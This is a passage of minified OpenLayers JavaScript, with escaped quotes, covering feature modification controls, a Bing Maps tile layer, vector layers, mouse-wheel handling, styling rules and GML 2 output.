a._index,OpenLayers.Util.removeItem(this.virtualVertices,a),this.vertices.push(a)):a==this.dragHandle?(this.layer.removeFeatures(this.vertices,{silent:!0}),this.vertices=[],this.radiusHandle&&(this.layer.destroyFeatures([this.radiusHandle],{silent:!0}),this.radiusHandle=null)):a!==this.radiusHandle&&this.layer.events.triggerEvent(\"vertexmodified\",\n{vertex:a.geometry,feature:this.feature,pixel:b}),0<this.virtualVertices.length&&(this.layer.destroyFeatures(this.virtualVertices,{silent:!0}),this.virtualVertices=[]),this.layer.drawFeature(this.feature,this.standalone?void 0:\"select\"));this.layer.drawFeature(a)},dragComplete:function(a){this.resetVertices();this.setFeatureState();this.onModification(this.feature);this.layer.events.triggerEvent(\"featuremodified\",{feature:this.feature})},setFeatureState:function(){if(this.feature.state!=OpenLayers.State.INSERT&&\nthis.feature.state!=OpenLayers.State.DELETE&&(this.feature.state=OpenLayers.State.UPDATE,this.modified&&this._originalGeometry)){var a=this.feature;a.modified=OpenLayers.Util.extend(a.modified,{geometry:this._originalGeometry});delete this._originalGeometry}},resetVertices:function(){0<this.vertices.length&&(this.layer.removeFeatures(this.vertices,{silent:!0}),this.vertices=[]);0<this.virtualVertices.length&&(this.layer.removeFeatures(this.virtualVertices,{silent:!0}),this.virtualVertices=[]);this.dragHandle&&\n(this.layer.destroyFeatures([this.dragHandle],{silent:!0}),this.dragHandle=null);this.radiusHandle&&(this.layer.destroyFeatures([this.radiusHandle],{silent:!0}),this.radiusHandle=null);this.feature&&\"OpenLayers.Geometry.Point\"!=this.feature.geometry.CLASS_NAME&&(this.mode&OpenLayers.Control.ModifyFeature.DRAG&&this.collectDragHandle(),this.mode&(OpenLayers.Control.ModifyFeature.ROTATE|OpenLayers.Control.ModifyFeature.RESIZE)&&this.collectRadiusHandle(),this.mode&OpenLayers.Control.ModifyFeature.RESHAPE&&\n(this.mode&OpenLayers.Control.ModifyFeature.RESIZE||this.collectVertices()))},handleKeypress:function(a){var b=a.keyCode;this.feature&&-1!=OpenLayers.Util.indexOf(this.deleteCodes,b)&&(b=this.layer.getFeatureFromEvent(this.handlers.drag.evt))&&(-1!=OpenLayers.Util.indexOf(this.vertices,b)&&!this.handlers.drag.dragging&&b.geometry.parent)&&(b.geometry.parent.removeComponent(b.geometry),this.layer.events.triggerEvent(\"vertexremoved\",{vertex:b.geometry,feature:this.feature,pixel:a.xy}),this.layer.drawFeature(this.feature,\nthis.standalone?void 0:\"select\"),this.modified=!0,this.resetVertices(),this.setFeatureState(),this.onModification(this.feature),this.layer.events.triggerEvent(\"featuremodified\",{feature:this.feature}))},collectVertices:function(){function a(c){var d,e,f;if(\"OpenLayers.Geometry.Point\"==c.CLASS_NAME)e=new OpenLayers.Feature.Vector(c),e._sketch=!0,e.renderIntent=b.vertexRenderIntent,b.vertices.push(e);else{f=c.components.length;\"OpenLayers.Geometry.LinearRing\"==c.CLASS_NAME&&(f-=1);for(d=0;d<f;++d)e=\nc.components[d],\"OpenLayers.Geometry.Point\"==e.CLASS_NAME?(e=new OpenLayers.Feature.Vector(e),e._sketch=!0,e.renderIntent=b.vertexRenderIntent,b.vertices.push(e)):a(e);if(b.createVertices&&\"OpenLayers.Geometry.MultiPoint\"!=c.CLASS_NAME)for(d=0,f=c.components.length;d<f-1;++d){e=c.components[d];var g=c.components[d+1];\"OpenLayers.Geometry.Point\"==e.CLASS_NAME&&\"OpenLayers.Geometry.Point\"==g.CLASS_NAME&&(e=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point((e.x+g.x)/2,(e.y+g.y)/2),null,b.virtualStyle),\ne.geometry.parent=c,e._index=d+1,e._sketch=!0,b.virtualVertices.push(e))}}}this.vertices=[];this.virtualVertices=[];var b=this;a.call(this,this.feature.geometry);this.layer.addFeatures(this.virtualVertices,{silent:!0});this.layer.addFeatures(this.vertices,{silent:!0})},collectDragHandle:function(){var a=this.feature.geometry,b=a.getBounds().getCenterLonLat(),b=new OpenLayers.Geometry.Point(b.lon,b.lat),c=new OpenLayers.Feature.Vector(b);b.move=function(b,c){OpenLayers.Geometry.Point.prototype.move.call(this,\nb,c);a.move(b,c)};c._sketch=!0;this.dragHandle=c;this.dragHandle.renderIntent=this.vertexRenderIntent;this.layer.addFeatures([this.dragHandle],{silent:!0})},collectRadiusHandle:function(){var a=this.feature.geometry,b=a.getBounds(),c=b.getCenterLonLat(),d=new OpenLayers.Geometry.Point(c.lon,c.lat),b=new OpenLayers.Geometry.Point(b.right,b.bottom),c=new OpenLayers.Feature.Vector(b),e=this.mode&OpenLayers.Control.ModifyFeature.RESIZE,f=this.mode&OpenLayers.Control.ModifyFeature.RESHAPE,g=this.mode&\nOpenLayers.Control.ModifyFeature.ROTATE;b.move=function(b,c){OpenLayers.Geometry.Point.prototype.move.call(this,b,c);var l=this.x-d.x,m=this.y-d.y,n=l-b,p=m-c;if(g){var q=Math.atan2(p,n),q=Math.atan2(m,l)-q,q=q*(180/Math.PI);a.rotate(q,d)}if(e){var r;f?(m/=p,r=l/n/m):(n=Math.sqrt(n*n+p*p),m=Math.sqrt(l*l+m*m)/n);a.resize(m,d,r)}};c._sketch=!0;this.radiusHandle=c;this.radiusHandle.renderIntent=this.vertexRenderIntent;this.layer.addFeatures([this.radiusHandle],{silent:!0})},setMap:function(a){this.handlers.drag.setMap(a);\nOpenLayers.Control.prototype.setMap.apply(this,arguments)},handleMapEvents:function(a){\"removelayer\"!=a.type&&\"order\"!=a.property||this.moveLayerToTop()},moveLayerToTop:function(){var a=Math.max(this.map.Z_INDEX_BASE.Feature-1,this.layer.getZIndex())+1;this.layer.setZIndex(a)},moveLayerBack:function(){var a=this.layer.getZIndex()-1;a>=this.map.Z_INDEX_BASE.Feature?this.layer.setZIndex(a):this.map.setLayerZIndex(this.layer,this.map.getLayerIndex(this.layer))},CLASS_NAME:\"OpenLayers.Control.ModifyFeature\"});\nOpenLayers.Control.ModifyFeature.RESHAPE=1;OpenLayers.Control.ModifyFeature.RESIZE=2;OpenLayers.Control.ModifyFeature.ROTATE=4;OpenLayers.Control.ModifyFeature.DRAG=8;OpenLayers.Layer.Bing=OpenLayers.Class(OpenLayers.Layer.XYZ,{key:null,serverResolutions:[156543.03390625,78271.516953125,39135.7584765625,19567.87923828125,9783.939619140625,4891.9698095703125,2445.9849047851562,1222.9924523925781,611.4962261962891,305.74811309814453,152.87405654907226,76.43702827453613,38.218514137268066,19.109257068634033,9.554628534317017,4.777314267158508,2.388657133579254,1.194328566789627,0.5971642833948135,0.29858214169740677,0.14929107084870338,0.07464553542435169],attributionTemplate:'<span class=\"olBingAttribution ${type}\"><div><a target=\"_blank\" href=\"http://www.bing.com/maps/\"><img src=\"${logo}\" /></a></div>${copyrights}<a style=\"white-space: nowrap\" target=\"_blank\" href=\"http://www.microsoft.com/maps/product/terms.html\">Terms of Use</a></span>',\nmetadata:null,protocolRegex:/^http:/i,type:\"Road\",culture:\"en-US\",metadataParams:null,tileOptions:null,protocol:~window.location.href.indexOf(\"http\")?\"\":\"http:\",initialize:function(a){a=OpenLayers.Util.applyDefaults({sphericalMercator:!0},a);OpenLayers.Layer.XYZ.prototype.initialize.apply(this,[a.name||\"Bing \"+(a.type||this.type),null,a]);this.tileOptions=OpenLayers.Util.extend({crossOriginKeyword:\"anonymous\"},this.options.tileOptions);this.loadMetadata()},loadMetadata:function(){this._callbackId=\n\"_callback_\"+this.id.replace(/\\./g,\"_\");window[this._callbackId]=OpenLayers.Function.bind(OpenLayers.Layer.Bing.processMetadata,this);var a=OpenLayers.Util.applyDefaults({key:this.key,jsonp:this._callbackId,include:\"ImageryProviders\"},this.metadataParams),a=this.protocol+\"//dev.virtualearth.net/REST/v1/Imagery/Metadata/\"+this.type+\"?\"+OpenLayers.Util.getParameterString(a),b=document.createElement(\"script\");b.type=\"text/javascript\";b.src=a;b.id=this._callbackId;document.getElementsByTagName(\"head\")[0].appendChild(b)},\ninitLayer:function(){var a=this.metadata.resourceSets[0].resources[0],b=a.imageUrl.replace(\"{quadkey}\",\"${quadkey}\"),b=b.replace(\"{culture}\",this.culture),b=b.replace(this.protocolRegex,this.protocol);this.url=[];for(var c=0;c<a.imageUrlSubdomains.length;++c)this.url.push(b.replace(\"{subdomain}\",a.imageUrlSubdomains[c]));this.addOptions({maxResolution:Math.min(this.serverResolutions[a.zoomMin],this.maxResolution||Number.POSITIVE_INFINITY),numZoomLevels:Math.min(a.zoomMax+1-a.zoomMin,this.numZoomLevels)},\n!0);this.isBaseLayer||this.redraw();this.updateAttribution()},getURL:function(a){if(this.url){var b=this.getXYZ(a);a=b.x;for(var c=b.y,b=b.z,d=[],e=b;0<e;--e){var f=\"0\",g=1<<e-1;0!=(a&g)&&f++;0!=(c&g)&&(f++,f++);d.push(f)}d=d.join(\"\");a=this.selectUrl(\"\"+a+c+b,this.url);return OpenLayers.String.format(a,{quadkey:d})}},updateAttribution:function(){var a=this.metadata;if(a.resourceSets&&this.map&&this.map.center){var b=a.resourceSets[0].resources[0],c=this.map.getExtent().transform(this.map.getProjectionObject(),\nnew OpenLayers.Projection(\"EPSG:4326\")),d=b.imageryProviders||[],e=OpenLayers.Util.indexOf(this.serverResolutions,this.getServerResolution()),b=\"\",f,g,h,k,l,m,n;g=0;for(h=d.length;g<h;++g)for(f=d[g],k=0,l=f.coverageAreas.length;k<l;++k)n=f.coverageAreas[k],m=OpenLayers.Bounds.fromArray(n.bbox,!0),c.intersectsBounds(m)&&(e<=n.zoomMax&&e>=n.zoomMin)&&(b+=f.attribution+\" \");a=a.brandLogoUri.replace(this.protocolRegex,this.protocol);this.attribution=OpenLayers.String.format(this.attributionTemplate,{type:this.type.toLowerCase(),\nlogo:a,copyrights:b});this.map&&this.map.events.triggerEvent(\"changelayer\",{layer:this,property:\"attribution\"})}},setMap:function(){OpenLayers.Layer.XYZ.prototype.setMap.apply(this,arguments);this.map.events.register(\"moveend\",this,this.updateAttribution)},clone:function(a){null==a&&(a=new OpenLayers.Layer.Bing(this.options));return a=OpenLayers.Layer.XYZ.prototype.clone.apply(this,[a])},destroy:function(){this.map&&this.map.events.unregister(\"moveend\",this,this.updateAttribution);OpenLayers.Layer.XYZ.prototype.destroy.apply(this,\narguments)},CLASS_NAME:\"OpenLayers.Layer.Bing\"});OpenLayers.Layer.Bing.processMetadata=function(a){this.metadata=a;this.initLayer();a=document.getElementById(this._callbackId);a.parentNode.removeChild(a);window[this._callbackId]=void 0;delete this._callbackId};OpenLayers.StyleMap=OpenLayers.Class({styles:null,extendDefault:!0,initialize:function(a,b){this.styles={\"default\":new OpenLayers.Style(OpenLayers.Feature.Vector.style[\"default\"]),select:new OpenLayers.Style(OpenLayers.Feature.Vector.style.select),temporary:new OpenLayers.Style(OpenLayers.Feature.Vector.style.temporary),\"delete\":new OpenLayers.Style(OpenLayers.Feature.Vector.style[\"delete\"])};if(a instanceof OpenLayers.Style)this.styles[\"default\"]=a,this.styles.select=a,this.styles.temporary=a,this.styles[\"delete\"]=\na;else if(\"object\"==typeof a)for(var c in a)if(a[c]instanceof OpenLayers.Style)this.styles[c]=a[c];else if(\"object\"==typeof a[c])this.styles[c]=new OpenLayers.Style(a[c]);else{this.styles[\"default\"]=new OpenLayers.Style(a);this.styles.select=new OpenLayers.Style(a);this.styles.temporary=new OpenLayers.Style(a);this.styles[\"delete\"]=new OpenLayers.Style(a);break}OpenLayers.Util.extend(this,b)},destroy:function(){for(var a in this.styles)this.styles[a].destroy();this.styles=null},createSymbolizer:function(a,\nb){a||(a=new OpenLayers.Feature.Vector);this.styles[b]||(b=\"default\");a.renderIntent=b;var c={};this.extendDefault&&\"default\"!=b&&(c=this.styles[\"default\"].createSymbolizer(a));return OpenLayers.Util.extend(c,this.styles[b].createSymbolizer(a))},addUniqueValueRules:function(a,b,c,d){var e=[],f;for(f in c)e.push(new OpenLayers.Rule({symbolizer:c[f],context:d,filter:new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.EQUAL_TO,property:b,value:f})}));this.styles[a].addRules(e)},CLASS_NAME:\"OpenLayers.StyleMap\"});OpenLayers.Layer.Vector=OpenLayers.Class(OpenLayers.Layer,{isBaseLayer:!1,isFixed:!1,features:null,filter:null,selectedFeatures:null,unrenderedFeatures:null,reportError:!0,style:null,styleMap:null,strategies:null,protocol:null,renderers:[\"SVG\",\"VML\",\"Canvas\"],renderer:null,rendererOptions:null,geometryType:null,drawn:!1,ratio:1,initialize:function(a,b){OpenLayers.Layer.prototype.initialize.apply(this,arguments);this.renderer&&this.renderer.supported()||this.assignRenderer();this.renderer&&this.renderer.supported()||\n(this.renderer=null,this.displayError());this.styleMap||(this.styleMap=new OpenLayers.StyleMap);this.features=[];this.selectedFeatures=[];this.unrenderedFeatures={};if(this.strategies)for(var c=0,d=this.strategies.length;c<d;c++)this.strategies[c].setLayer(this)},destroy:function(){if(this.strategies){var a,b,c;b=0;for(c=this.strategies.length;b<c;b++)a=this.strategies[b],a.autoDestroy&&a.destroy();this.strategies=null}this.protocol&&(this.protocol.autoDestroy&&this.protocol.destroy(),this.protocol=\nnull);this.destroyFeatures();this.unrenderedFeatures=this.selectedFeatures=this.features=null;this.renderer&&this.renderer.destroy();this.drawn=this.geometryType=this.renderer=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)},clone:function(a){null==a&&(a=new OpenLayers.Layer.Vector(this.name,this.getOptions()));a=OpenLayers.Layer.prototype.clone.apply(this,[a]);for(var b=this.features,c=b.length,d=Array(c),e=0;e<c;++e)d[e]=b[e].clone();a.features=d;return a},refresh:function(a){this.calculateInRange()&&\nthis.visibility&&this.events.triggerEvent(\"refresh\",a)},assignRenderer:function(){for(var a=0,b=this.renderers.length;a<b;a++){var c=this.renderers[a];if((c=\"function\"==typeof c?c:OpenLayers.Renderer[c])&&c.prototype.supported()){this.renderer=new c(this.div,this.rendererOptions);break}}},displayError:function(){this.reportError&&OpenLayers.Console.userError(OpenLayers.i18n(\"browserNotSupported\",{renderers:this.renderers.join(\"\\n\")}))},setMap:function(a){OpenLayers.Layer.prototype.setMap.apply(this,\narguments);if(this.renderer){this.renderer.map=this.map;var b=this.map.getSize();b.w*=this.ratio;b.h*=this.ratio;this.renderer.setSize(b)}else this.map.removeLayer(this)},afterAdd:function(){if(this.strategies){var a,b,c;b=0;for(c=this.strategies.length;b<c;b++)a=this.strategies[b],a.autoActivate&&a.activate()}},removeMap:function(a){this.drawn=!1;if(this.strategies){var b,c;b=0;for(c=this.strategies.length;b<c;b++)a=this.strategies[b],a.autoActivate&&a.deactivate()}},onMapResize:function(){OpenLayers.Layer.prototype.onMapResize.apply(this,\narguments);var a=this.map.getSize();a.w*=this.ratio;a.h*=this.ratio;this.renderer.setSize(a)},moveTo:function(a,b,c){OpenLayers.Layer.prototype.moveTo.apply(this,arguments);var d=!0;if(!c){this.renderer.root.style.visibility=\"hidden\";var d=this.map.getSize(),e=d.w,d=d.h,e=e/2*this.ratio-e/2,d=d/2*this.ratio-d/2,e=e+this.map.layerContainerOriginPx.x,e=-Math.round(e),d=d+this.map.layerContainerOriginPx.y,d=-Math.round(d);this.div.style.left=e+\"px\";this.div.style.top=d+\"px\";e=this.map.getExtent().scale(this.ratio);\nd=this.renderer.setExtent(e,b);this.renderer.root.style.visibility=\"visible\";!0===OpenLayers.IS_GECKO&&(this.div.scrollLeft=this.div.scrollLeft);if(!b&&d)for(var f in this.unrenderedFeatures)e=this.unrenderedFeatures[f],this.drawFeature(e)}if(!this.drawn||b||!d)for(this.drawn=!0,f=0,d=this.features.length;f<d;f++)this.renderer.locked=f!==d-1,e=this.features[f],this.drawFeature(e)},display:function(a){OpenLayers.Layer.prototype.display.apply(this,arguments);var b=this.div.style.display;b!=this.renderer.root.style.display&&\n(this.renderer.root.style.display=b)},addFeatures:function(a,b){OpenLayers.Util.isArray(a)||(a=[a]);var c=!b||!b.silent;if(c){var d={features:a};if(!1===this.events.triggerEvent(\"beforefeaturesadded\",d))return;a=d.features}for(var d=[],e=0,f=a.length;e<f;e++){this.renderer.locked=e!=a.length-1?!0:!1;var g=a[e];if(this.geometryType&&!(g.geometry instanceof this.geometryType))throw new TypeError(\"addFeatures: component should be an \"+this.geometryType.prototype.CLASS_NAME);g.layer=this;!g.style&&this.style&&\n(g.style=OpenLayers.Util.extend({},this.style));if(c){if(!1===this.events.triggerEvent(\"beforefeatureadded\",{feature:g}))continue;this.preFeatureInsert(g)}d.push(g);this.features.push(g);this.drawFeature(g);c&&(this.events.triggerEvent(\"featureadded\",{feature:g}),this.onFeatureInsert(g))}c&&this.events.triggerEvent(\"featuresadded\",{features:d})},removeFeatures:function(a,b){if(a&&0!==a.length){if(a===this.features)return this.removeAllFeatures(b);OpenLayers.Util.isArray(a)||(a=[a]);a===this.selectedFeatures&&\n(a=a.slice());var c=!b||!b.silent;c&&this.events.triggerEvent(\"beforefeaturesremoved\",{features:a});for(var d=a.length-1;0<=d;d--){this.renderer.locked=0!=d&&a[d-1].geometry?!0:!1;var e=a[d];delete this.unrenderedFeatures[e.id];c&&this.events.triggerEvent(\"beforefeatureremoved\",{feature:e});this.features=OpenLayers.Util.removeItem(this.features,e);e.layer=null;e.geometry&&this.renderer.eraseFeatures(e);-1!=OpenLayers.Util.indexOf(this.selectedFeatures,e)&&OpenLayers.Util.removeItem(this.selectedFeatures,\ne);c&&this.events.triggerEvent(\"featureremoved\",{feature:e})}c&&this.events.triggerEvent(\"featuresremoved\",{features:a})}},removeAllFeatures:function(a){a=!a||!a.silent;var b=this.features;a&&this.events.triggerEvent(\"beforefeaturesremoved\",{features:b});for(var c,d=b.length-1;0<=d;d--)c=b[d],a&&this.events.triggerEvent(\"beforefeatureremoved\",{feature:c}),c.layer=null,a&&this.events.triggerEvent(\"featureremoved\",{feature:c});this.renderer.clear();this.features=[];this.unrenderedFeatures={};this.selectedFeatures=\n[];a&&this.events.triggerEvent(\"featuresremoved\",{features:b})},destroyFeatures:function(a,b){void 0==a&&(a=this.features);if(a){this.removeFeatures(a,b);for(var c=a.length-1;0<=c;c--)a[c].destroy()}},drawFeature:function(a,b){if(this.drawn){if(\"object\"!=typeof b){b||a.state!==OpenLayers.State.DELETE||(b=\"delete\");var c=b||a.renderIntent;(b=a.style||this.style)||(b=this.styleMap.createSymbolizer(a,c))}c=this.renderer.drawFeature(a,b);!1===c||null===c?this.unrenderedFeatures[a.id]=a:delete this.unrenderedFeatures[a.id]}},\neraseFeatures:function(a){this.renderer.eraseFeatures(a)},getFeatureFromEvent:function(a){if(!this.renderer)throw Error(\"getFeatureFromEvent called on layer with no renderer. This usually means you destroyed a layer, but not some handler which is associated with it.\");var b=null;(a=this.renderer.getFeatureIdFromEvent(a))&&(b=\"string\"===typeof a?this.getFeatureById(a):a);return b},getFeatureBy:function(a,b){for(var c=null,d=0,e=this.features.length;d<e;++d)if(this.features[d][a]==b){c=this.features[d];\nbreak}return c},getFeatureById:function(a){return this.getFeatureBy(\"id\",a)},getFeatureByFid:function(a){return this.getFeatureBy(\"fid\",a)},getFeaturesByAttribute:function(a,b){var c,d,e=this.features.length,f=[];for(c=0;c<e;c++)(d=this.features[c])&&d.attributes&&d.attributes[a]===b&&f.push(d);return f},onFeatureInsert:function(a){},preFeatureInsert:function(a){},getDataExtent:function(){var a=null,b=this.features;if(b&&0<b.length)for(var c=null,d=0,e=b.length;d<e;d++)if(c=b[d].geometry)null===a&&\n(a=new OpenLayers.Bounds),a.extend(c.getBounds());return a},CLASS_NAME:\"OpenLayers.Layer.Vector\"});OpenLayers.Layer.PointGrid=OpenLayers.Class(OpenLayers.Layer.Vector,{dx:null,dy:null,ratio:1.5,maxFeatures:250,rotation:0,origin:null,gridBounds:null,initialize:function(a){a=a||{};OpenLayers.Layer.Vector.prototype.initialize.apply(this,[a.name,a])},setMap:function(a){OpenLayers.Layer.Vector.prototype.setMap.apply(this,arguments);a.events.register(\"moveend\",this,this.onMoveEnd)},removeMap:function(a){a.events.unregister(\"moveend\",this,this.onMoveEnd);OpenLayers.Layer.Vector.prototype.removeMap.apply(this,\narguments)},setRatio:function(a){this.ratio=a;this.updateGrid(!0)},setMaxFeatures:function(a){this.maxFeatures=a;this.updateGrid(!0)},setSpacing:function(a,b){this.dx=a;this.dy=b||a;this.updateGrid(!0)},setOrigin:function(a){this.origin=a;this.updateGrid(!0)},getOrigin:function(){this.origin||(this.origin=this.map.getExtent().getCenterLonLat());return this.origin},setRotation:function(a){this.rotation=a;this.updateGrid(!0)},onMoveEnd:function(){this.updateGrid()},getViewBounds:function(){var a=this.map.getExtent();\nif(this.rotation){var b=this.getOrigin(),b=new OpenLayers.Geometry.Point(b.lon,b.lat),a=a.toGeometry();a.rotate(-this.rotation,b);a=a.getBounds()}return a},updateGrid:function(a){if(a||this.invalidBounds()){var b=this.getViewBounds(),c=this.getOrigin();a=new OpenLayers.Geometry.Point(c.lon,c.lat);var d=b.getWidth(),e=b.getHeight(),f=d/e,g=Math.sqrt(this.dx*this.dy*this.maxFeatures/f),d=Math.min(d*this.ratio,g*f),e=Math.min(e*this.ratio,g),b=b.getCenterLonLat();this.gridBounds=new OpenLayers.Bounds(b.lon-\nd/2,b.lat-e/2,b.lon+d/2,b.lat+e/2);for(var b=Math.floor(e/this.dy),d=Math.floor(d/this.dx),e=c.lon+this.dx*Math.ceil((this.gridBounds.left-c.lon)/this.dx),c=c.lat+this.dy*Math.ceil((this.gridBounds.bottom-c.lat)/this.dy),g=Array(b*d),h,k=0;k<d;++k)for(var f=e+k*this.dx,l=0;l<b;++l)h=c+l*this.dy,h=new OpenLayers.Geometry.Point(f,h),this.rotation&&h.rotate(this.rotation,a),g[k*b+l]=new OpenLayers.Feature.Vector(h);this.destroyFeatures(this.features,{silent:!0});this.addFeatures(g,{silent:!0})}},invalidBounds:function(){return!this.gridBounds||\n!this.gridBounds.containsBounds(this.getViewBounds())},CLASS_NAME:\"OpenLayers.Layer.PointGrid\"});OpenLayers.Handler.MouseWheel=OpenLayers.Class(OpenLayers.Handler,{wheelListener:null,interval:0,maxDelta:Number.POSITIVE_INFINITY,delta:0,cumulative:!0,initialize:function(a,b,c){OpenLayers.Handler.prototype.initialize.apply(this,arguments);this.wheelListener=OpenLayers.Function.bindAsEventListener(this.onWheelEvent,this)},destroy:function(){OpenLayers.Handler.prototype.destroy.apply(this,arguments);this.wheelListener=null},onWheelEvent:function(a){if(this.map&&this.checkModifiers(a)){for(var b=\n!1,c=!1,d=!1,e=OpenLayers.Event.element(a);null!=e&&!d&&!b;){if(!b)try{var f,b=(f=e.currentStyle?e.currentStyle.overflow:document.defaultView.getComputedStyle(e,null).getPropertyValue(\"overflow\"))&&\"auto\"==f||\"scroll\"==f}catch(g){}if(!c&&(c=OpenLayers.Element.hasClass(e,\"olScrollable\"),!c))for(var d=0,h=this.map.layers.length;d<h;d++){var k=this.map.layers[d];if(e==k.div||e==k.pane){c=!0;break}}d=e==this.map.div;e=e.parentNode}if(!b&&d){if(c)if(b=0,a.wheelDelta?(b=a.wheelDelta,0===b%160&&(b*=0.75),\nb/=120):a.detail&&(b=-(a.detail/Math.abs(a.detail))),this.delta+=b,window.clearTimeout(this._timeoutId),this.interval&&Math.abs(this.delta)<this.maxDelta){var l=OpenLayers.Util.extend({},a);this._timeoutId=window.setTimeout(OpenLayers.Function.bind(function(){this.wheelZoom(l)},this),this.interval)}else this.wheelZoom(a);OpenLayers.Event.stop(a)}}},wheelZoom:function(a){var b=this.delta;this.delta=0;b&&(a.xy=this.map.events.getMousePosition(a),0>b?this.callback(\"down\",[a,this.cumulative?Math.max(-this.maxDelta,\nb):-1]):this.callback(\"up\",[a,this.cumulative?Math.min(this.maxDelta,b):1]))},activate:function(a){if(OpenLayers.Handler.prototype.activate.apply(this,arguments)){var b=this.wheelListener;OpenLayers.Event.observe(window,\"DOMMouseScroll\",b);OpenLayers.Event.observe(window,\"mousewheel\",b);OpenLayers.Event.observe(document,\"mousewheel\",b);return!0}return!1},deactivate:function(a){if(OpenLayers.Handler.prototype.deactivate.apply(this,arguments)){var b=this.wheelListener;OpenLayers.Event.stopObserving(window,\n\"DOMMouseScroll\",b);OpenLayers.Event.stopObserving(window,\"mousewheel\",b);OpenLayers.Event.stopObserving(document,\"mousewheel\",b);return!0}return!1},CLASS_NAME:\"OpenLayers.Handler.MouseWheel\"});OpenLayers.Symbolizer=OpenLayers.Class({zIndex:0,initialize:function(a){OpenLayers.Util.extend(this,a)},clone:function(){return new (eval(this.CLASS_NAME))(OpenLayers.Util.extend({},this))},CLASS_NAME:\"OpenLayers.Symbolizer\"});OpenLayers.Symbolizer.Raster=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:\"OpenLayers.Symbolizer.Raster\"});OpenLayers.Rule=OpenLayers.Class({id:null,name:null,title:null,description:null,context:null,filter:null,elseFilter:!1,symbolizer:null,symbolizers:null,minScaleDenominator:null,maxScaleDenominator:null,initialize:function(a){this.symbolizer={};OpenLayers.Util.extend(this,a);this.symbolizers&&delete this.symbolizer;this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+\"_\")},destroy:function(){for(var a in this.symbolizer)this.symbolizer[a]=null;this.symbolizer=null;delete this.symbolizers},evaluate:function(a){var b=\nthis.getContext(a),c=!0;if(this.minScaleDenominator||this.maxScaleDenominator)var d=a.layer.map.getScale();this.minScaleDenominator&&(c=d>=OpenLayers.Style.createLiteral(this.minScaleDenominator,b));c&&this.maxScaleDenominator&&(c=d<OpenLayers.Style.createLiteral(this.maxScaleDenominator,b));c&&this.filter&&(c=\"OpenLayers.Filter.FeatureId\"==this.filter.CLASS_NAME?this.filter.evaluate(a):this.filter.evaluate(b));return c},getContext:function(a){var b=this.context;b||(b=a.attributes||a.data);\"function\"==\ntypeof this.context&&(b=this.context(a));return b},clone:function(){var a=OpenLayers.Util.extend({},this);if(this.symbolizers){var b=this.symbolizers.length;a.symbolizers=Array(b);for(var c=0;c<b;++c)a.symbolizers[c]=this.symbolizers[c].clone()}else{a.symbolizer={};for(var d in this.symbolizer)b=this.symbolizer[d],c=typeof b,\"object\"===c?a.symbolizer[d]=OpenLayers.Util.extend({},b):\"string\"===c&&(a.symbolizer[d]=b)}a.filter=this.filter&&this.filter.clone();a.context=this.context&&OpenLayers.Util.extend({},\nthis.context);return new OpenLayers.Rule(a)},CLASS_NAME:\"OpenLayers.Rule\"});OpenLayers.Format.SLD=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{profile:null,defaultVersion:\"1.0.0\",stringifyOutput:!0,namedLayersAsArray:!1,CLASS_NAME:\"OpenLayers.Format.SLD\"});OpenLayers.Symbolizer.Polygon=OpenLayers.Class(OpenLayers.Symbolizer,{initialize:function(a){OpenLayers.Symbolizer.prototype.initialize.apply(this,arguments)},CLASS_NAME:\"OpenLayers.Symbolizer.Polygon\"});OpenLayers.Format.GML.v2=OpenLayers.Class(OpenLayers.Format.GML.Base,{schemaLocation:\"http://www.opengis.net/gml http://schemas.opengis.net/gml/2.1.2/feature.xsd\",initialize:function(a){OpenLayers.Format.GML.Base.prototype.initialize.apply(this,[a])},readers:{gml:OpenLayers.Util.applyDefaults({outerBoundaryIs:function(a,b){var c={};this.readChildNodes(a,c);b.outer=c.components[0]},innerBoundaryIs:function(a,b){var c={};this.readChildNodes(a,c);b.inner.push(c.components[0])},Box:function(a,b){var c=\n{};this.readChildNodes(a,c);b.components||(b.components=[]);var d=c.points[0],c=c.points[1];b.components.push(new OpenLayers.Bounds(d.x,d.y,c.x,c.y))}},OpenLayers.Format.GML.Base.prototype.readers.gml),feature:OpenLayers.Format.GML.Base.prototype.readers.feature,wfs:OpenLayers.Format.GML.Base.prototype.readers.wfs},write:function(a){var b;b=OpenLayers.Util.isArray(a)?\"wfs:FeatureCollection\":\"gml:featureMember\";a=this.writeNode(b,a);this.setAttributeNS(a,this.namespaces.xsi,\"xsi:schemaLocation\",this.schemaLocation);\nreturn OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{gml:OpenLayers.Util.applyDefaults({Point:function(a){var b=this.createElementNSPlus(\"gml:Point\");this.writeNode(\"coordinates\",[a],b);return b},coordinates:function(a){for(var b=a.length,c=Array(b),d,e=0;e<b;++e)d=a[e],c[e]=this.xy?d.x+\",\"+d.y:d.y+\",\"+d.x,void 0!=d.z&&(c[e]+=\",\"+d.z);return this.createElementNSPlus(\"gml:coordinates\",{attributes:{decimal:\".\",cs:\",\",ts:\" \"},value:1==b?c[0]:c.join(\" \")})},LineString:function(a){var b=\nthis.createElementNSPlus(\"gml:LineString\");this.writeNode(\"coordinates\",a.components,b);return b},Polygon:function(a){var b=this.createElementNSPlus(\"gml:Polygon\");this.writeNode(\"outerBoundaryIs\",a.components[0],b);for(var c=1;c<a.components.length;++c)this.writeNode(\"innerBoundaryIs\",a.components[c],b);return b},outerBoundaryIs:function(a){var b=this.createElementNSPlus(\"gml:outerBoundaryIs\");this.writeNode(\"LinearRing\",a,b);return b},innerBoundaryIs:function(a){var b=this.createElementNSPlus(\"gml:innerBoundaryIs\");\nthis.writeNode(\"LinearRing\",a,b);return b},LinearRing:function(a){var b=this.createElementNSPlus(\"gml:LinearRing\");this.writeNode(\"coordinates\",a.components,b);return b},Box:function(a){var b=this.createElementNSPlus(\"gml:Box\");this.writeNode(\"coordinates\",[{x:a.left,y:a.bottom},{x:a.right,y:a.top}],b);this.srsName&&b.setAttribute(\"srsName\",this.srsName);return 